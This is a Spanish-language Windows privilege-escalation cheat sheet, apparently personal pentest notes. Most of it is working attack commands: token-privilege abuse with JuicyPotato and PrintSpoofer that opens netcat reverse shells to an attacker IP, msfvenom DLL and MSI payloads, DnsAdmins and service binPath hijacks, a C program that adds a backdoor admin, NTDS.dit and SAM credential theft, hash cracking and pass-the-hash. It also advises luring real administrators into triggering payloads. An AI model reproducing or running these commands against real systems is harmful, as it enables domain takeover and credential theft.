## Info

- Windows usa access tokens para interrelacionarse con las apps y gestionar la autenticación de manera sencilla y automática, funciona como el HASH



## Correr un cmd como otro usuario local
    runas /user:backupadmin cmd
## Abuso de privilegios

### Abusar del SeImpersonate priv
Si nuestro usuario tiene el privilegio de SeImpersonate podemos abusar de él y conseguir una shell reversa.
#### Escalar privilegios con JuiciPotato:
##### Juicipotato no funciona en WS 2019 y windows 10 build 1809 en adelante. Para estos casos usar printspoofer o rogepotato
- l = local port
- p = programa a correr
- a = Argumento que se le va a pasar al programa
- t = creación de proceso 

    JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
    
A veces Juici no funciona bien de una, deberemos buscar CLSIDS correspondientes. Podemos encontrarlos en el siguiente link:

    https://ohpe.it/juicy-potato/CLSID/

Luego: agregamos el CLSID con la opción -c "{CLSID}"

    jp.exe -l 53375 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe -e cmd.exe 10.10.14.3 4443" -t *

#### Escalar privilegios con PrintSpoofer
    PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

### Abusar del SeDebugPrivilege

Podemos usar mimikatz para dumpear las contraseñas guardadas en la caché. Para llevar adelante este ataque mirar:

https://github.com/LaPorota/LaPorota_suite/blob/main/infraestructura/windows/dump_credentials_cached_mimikatz.md


### Abusar del SeTakeOwnershipPrivilege
Si tenemos este privilegio podemos tomar control de recursos que no nos pertenecen y no son accesibles por nosotros.
##### Si el permiso está pero se encuentra deshabilitado podemos usar el siguiente script

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

Luego elegimos el archivo sobre el que queremos tomar control y usamos el binario de windows takeown

        takeown /f 'path_to_file'
##### Hay casos en que esto no es suficiente debido a los ACL del AD. para estos casos podemos usar icacls:

        icacls 'path_to_file' /grant <our_user>:F

### Abuso de SeBackupPrivilege

Este privilegio nos permite listar y copiar el contenido de cualquier carpeta.
#### Si el permiso se encuentra pero está deshabilitado podemos usar el siguiente los siguientes scrits, invocarlos desde powershell y correr el comando siguiente
https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug


        Set-SeBackupPrivilege
#### 1)Buscamos el archivo que no podemos leer y lo copiamos
         Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Luego podremos manipular el archivo para lograr acceder a su contenido (incluido enviarlo a un linux)

#### Atacando al domain controller copiando el NTDS.dit
El SeBackupPrivilege también nos permite loguearnos al DC en un antorno de AD

Podremos crear una copia del disco del DC y robar de él el NTDS.dit (archivo donde se guardan los hash NTLM de todos los usuarios del dominio)

##### 1) llamamos al proceso diskdhadow(viene con windows)
        diskshadow.exe
##### 2)hacemos la copia
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
##### 3) copiamos el NTDS.dit de la partición E: que acabamos de crear
        Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

##### 4) Extraer las credenciales del NTDS.dit
###### windows:
        Import-Module .\DSInternals.psd1

Luego:
        $key = Get-BootKey -SystemHivePath .\SYSTEM

Y luego dumpeamos con:

        Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
###### Linux:
        secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
        
#### También podemos dumpear los registros de Sam y system:
Seguir los pasos:

https://github.com/LaPorota/LaPorota_suite/blob/main/infraestructura/windows/Sam_attack


********
--------

## Abuso de privilegios de grupos

### Abuso de Event log readers
Si pertenecemos al grupo de "Event Log Readers" podemos recorrer los logs de seguridad para robar passwords
#### Con wevutil:
        wevtutil qe Security /rd:true /f:text | Select-String "/user"
    
#### Con Get-WinEvent
        Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

### Abuso del "DnsAdmins" group

Los miembros del DnsAdmins group pueden correr algunos binarios como administradores del DC, esto quiere decir que podríamos agregar un Domain Admin.

#### 1) creamos el binario
        msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll

#### 2)Lo hacemos llegar a la pc víStima
#### 3) Ejecutamos el comando para que la pc nos reconozca (si no lo hizo aún) como miebros del DnsAdmins
        Get-ADGroupMember -Identity DnsAdmins
#### 4) Corremos el binario por medio de dnscmd y serverlevelplugindll
        dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
#### 5) Stopeamos el servicio de dns
        sc stop dns
#### 6) Lo iniciamos nuevamente
        sc start dns
#### 7) Comprobamos si estamos ya dentro del domain admins group
        net group "Domain Admins" /dom
#### 8) Nos deslogueamos y volvemos a loguear para que se refresque el token de windows.

### Abuso del grupo Print Operators group
El print operators group da a sus miembros el SeLoadDriverPrivilege. Este privilegio nos permite:
- Gestionar, eliminar, compartir y crear impresoras en el DC.
- Permite tambien el login en el DC y apagarlo.

Para explotarlo es muy simple:
#### 1) Metemos los archivos EoPLoadDriver.exe, Capcom.sys y ExploitCapcom.exe
#### 2) Corremos EoPLoaderDriver.exe junto con el Capcom.sys
        EoPLoadDriver.exe System\CurrentControlSet\Capcom Capcom.sys

#### 3) Corremos el ExploitCapcom.exe y recibimos una shell con permisos de system

### Abuse Server Operators group
- Permite a sus miembros administrar servidores sin tener privilegios de Domain Admin.
- Tiene permitido loguearse en todos los servers incluído el DC
- Brinda a sus miembros el SeBackupPrivilege y SeRestorePrivilege
- Brinda a sus miembros la capacidad de controlar servicios locales

Para explotarlo:
##### Si lo hacemos en el DC nos adueñamos de todo.
#### 1) Buscamos un servicio local que corra como system
#### 2) Cambiamos el  path binario del servicio para agregarnos un user al grupo de admins
        sc config <servicio> binPath= "cmd /c net localgroup Administrators <user> /add"
#### 3) Iniciamos el servicio
        sc start <servicio>
#### 4) Deslogueamos y volvemos a loguear





*******
-------

# EXPLOTACION DE SERVICIOS

### Explotación de pipelist

#### 1)Listamos los pipelist:

##### Cmd:

        pipelist.exe /accepteula
##### Powershell:

        gci \\.\pipe\

#### 2)Enumeramos los permisos que tiene un pipelist

        accesschk.exe /accepteula \\.\Pipe\<nombre_del_pipe> -v


### EXPLOTACION DE SERVICIOS CON PERMISOS INSEGUROS:

#### 1)Podemos listar servicios del sistema que tengan problemas de ACLs con SharpUp

https://github.com/GhostPack/SharpUp/ (recordar sacar el binario del módulo del capítulo de weak permissions y sumarlo a las apps)

#### o buscar servicios en powershell

    Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

#### 2) Luego de listar los servicios corriendo en el servidor podemos consultar por medio de la herramienta accesschk.exe (tenemos que introducirla en el sistema) los permisos que tiene el user sobre la misma con el comando:

    accesschk.exe /accepteula -uwcqv USUARIO_EN_USO SERVICIO_A_CONSULTAR

##### Podemos hacerlo también con icacls:
    icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

Los users tendrán diferentes tipos de privilegios aquí la tabla con sus significados:

|char | permisos |
|----|-----|
|F | Full access |
|M | Modify acces |
|RX | read and execute access |
|R | read only|
|W | write only|

si la opción SERVICE_CHANGE_CONFIG se encuentra dentro de RW(read and write)(en icacls se ve como "(I)(F)")
Podremos modificar su configuración.

Podemos hacer una query al servicio para ver con qué privilegios/user corre con el comando:


    sc qc servicio

Si el servicio corre con usuarios administradores o super usuarios (SERVICE_START_NAME)nos es propicio para ser utilizado para elevar privilegios:
modificaremos el BINPATH del mismo para que al momento de ser ejecutado, llame a un nuevo proceso o programa malicioso.

    sc config <user> binpath= "\"C:\PATH\TO\MALICIOUS.exe""

##### podemos también agregar un user al grupo de administrators.
    
     sc config <service> binpath="cmd /c net localgroup administrators <user> /add"

ahora podemos correr el servicio y que nos genere una shell reversa:
    
    net start servicio


Otra opción es crear un ejecutable que reemplace al servicio para que al ser ejecutado nos genere un nuevo admin user:

##### 1) creamos el script en C en nuestra máquina atacante:

#include <stdlib.h>

    int main ()
    {
      int i;
      
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
      
      return 0;
    }


##### 2) lo compilamos

    gcc script.c -o <nombre_del_exe_a_reemplazar>

##### 3) lo pasamos a la máquina victima

    iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

##### 4) copiamos el original para luego revertir las acciones

    move <path_to_service> <service>
##### 5) copiamos el nuestro exe malicioso en la dirección del original

    move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

#### 6) hacemos un stop del servicio

    net stop mysql

#### 7)Listamos el servicio y si el servicio está en StartMode auto Reiniciamos le sistema

    Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#### rebot

    shutdown /r /t 0

#### Iniciamos el sistema y vemos si nuestro usuario ya es parte de los admins

    Get-LocalGroupMember administrators

### EXPLOTACIÓN DE SERVICIOS UNQUOTED:

Es posible explotarlo cuando el path del servicio no está entre comillas y tiene espacios en los nombres del path.

Hacemos una query al servicio y vemos si el BINARY_PATH_FILE se encuentra con las caracteristicas antes mencionadas:

        sc qc servicio

Vemos con accesschk.exe quienes pueden escribir en el directorio del servicio:

        accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 

Si nuestro usuario/grupo al que pertenece puede leer y escribir reemplazamos el archivo commons.exe por nuestro binario con la reverse shell:

        copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

ponemos un netcat en listener y corremos el servicio


        net start servicio

### WEAK REGISTRY PERMISSIONS:

Una vez identificado un servicio que corre con privilegios elevados, corremos el accesschk.exe para ver si nuestro user/grupo al que pertenece puede escribir entradas de registro:

        accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicio

De tenerlos, podemos reescribir el imagepath key para que apunte a un archivo malicioso:


        reg add HKLM\SYSTEM\CurrentControlSet\services\service /v ImagePath /t REG_EXPAND_SZ /d C:\Path\to/malicious.exe /f

Iniciamos un netcat como listener y corremos el servicio

        net start regsvc

### INSECURE SERVICE EXECUTABLES

Una vez que detectamos el servicio con privilegios elevados, nos fijamos con accesschk.exe si el binario del servicio es writeable por nuestro user/grupo.

        C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\servicio.exe"

De tener permisos de escritura sobre el archivo, podemos reemplazarlo por nuestro archivo malicioso:

        copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\servicio.exe" /Y

Luego corremos netcat y corremos el servicio.

        net start servicio



## REGISTRY EXPLOITATION


### EXPLOIT AUTORUNS

Buscamos en el registro ejecutables de autoruns

        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

usamos accesschk.exe para ver los permisos que tienen los autoruns

        accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\AUTORUN.exe"

Si nuestro user/grupo tiene permisos de escritura sobre el autorun, lo reemplazamos por el archivo malicioso y reiniciamos la pc(en un entorno real es mejor apagarla para llamar la atención del admin y 
que se loguee en la misma):

        copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

abrimos netcat y esperamos a que alguien encienda la máquina y se loguee


### ALWAYSINSTALLELEVATED 


Hacemos una query al registro buscando las keys de Alwaysinstallelevated

        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

si en ambos casos las keys están seteadas en 1 (0x1 == true)

generamos un archivo malicioso .msi con una shell reversa y lo pasamos a la víctima:

        msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

lo instalamos y se nos va a generar una shell reversa con permisos de admin.

        msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart



## PASSWORDS

### REGISTRY

podemos buscar passwords en el registro de windows: 
Usualmente, si están, se encuentran en el archivo winlogon. De esta forma podemos listarlo:

        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

De no estar ahí podemos expandir nuestra búsqueda listando archivos del registro que tengan la key o el value "password" y luego volver a listar cada uno con el comando anterior:

        reg query HKLM /f password /t REG_SZ /s

si encontramos la password podemos conectarnos desde kali con el winexe:

        winexe -U 'admin%password' //IP-VICTIMA cmd.exe


### SAVED CREDS

Podemos listar las credenciales guardadas en el sistema con el siguiente comando:

        cmdkey /list

Si entre las credenciales guardadas aparecen las del admin(no vamos a ver la password) podemos correr nuestro binario malicioso como admin y tener una reverse shell:


        runas /savecred /user:admin C:\PrivEsc\reverse.exe



### SAM

Si podemos extraer el SAM y System (usualmente se encuentran en la carpeta windows/repair)

podemos unirlos con creddump7 y extraer el hash, luego con hashcat podemos intentar romperlo:

        git clone https://github.com/Tib3rius/creddump7
        pip3 install pycrypto
        python3 creddump7/pwdump.py SYSTEM SAM

##### Luego las rompemos con hashcat

        hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt

###### PASSING THE HASH

Si obtuvimos el hash pero no lo podemos romper, podemos loguearnos con el hash utilizando pth-winexe:

        pth-winexe -U 'admin%hash' //10.10.11.49 cmd.exe


### SCHEDULED TASKS

#### Enumerar las scheduled task desde powershell:
        Get-ScheduledTask | select TaskName,State


Si encontramos un archivo que corre tareas programadas y tenemos capacidades de escritura en los mismos podemos agregegarle una ejecución a nuestro binario malicioso:

        accesschk.exe /accepteula -wvu "C:\PATH\To\file"

##### La ruta al archivo maliciosa debe ser absoluta!!!

        echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

Esperamos con nuestro netcat a que se ejecute.

### INSECURE GUI APPS

Si vemos que una app corre como administrador (para esto necesitamos tener un entorno gráfico) podemos usarla para correr un cmd con los mismos privilegios:

Para ver con qué privilegios corre:

        tasklist /V | findstr binario_de_la_app.exe

Abrimos la app y le damos open para cargar un archivo "X" y en el explorador de windows colocamos:  

        file://c:/windows/system32/cmd.exe (o el path al cmd.exe)


-------
*******

## Explotación del SO

### UAC Bypass
Cada build de windows tiene su propia vulnerabilidad referida al UAC. En el siguiente repo podemos ver versiones para muchas versiones

https://github.com/hfiref0x/UACME/tree/v3.2.x

### UAC Exploitation con hhupd.exe
#### 1) Cargamos el hhupd.exe en la pc victima
#### 2) Lo corremos como admin y vemos que nos da un prompt
#### 3) Show information about the publisher's certificate

## Cambiar la contraseña de un usuario local en windows
Set-LocalUser -Name "NombreDeUsuario" -Password (ConvertTo-SecureString -AsPlainText "NuevaContraseña" -Force)

#### 4) General, click en el link de issued by y luego en ok
#### 5) Una vez en el navegador, vemos el código fuente y vamos a save as
#### 6) Luego en el filepath vamos al cmd:
    c:\windows\system32\cmd.exe
    
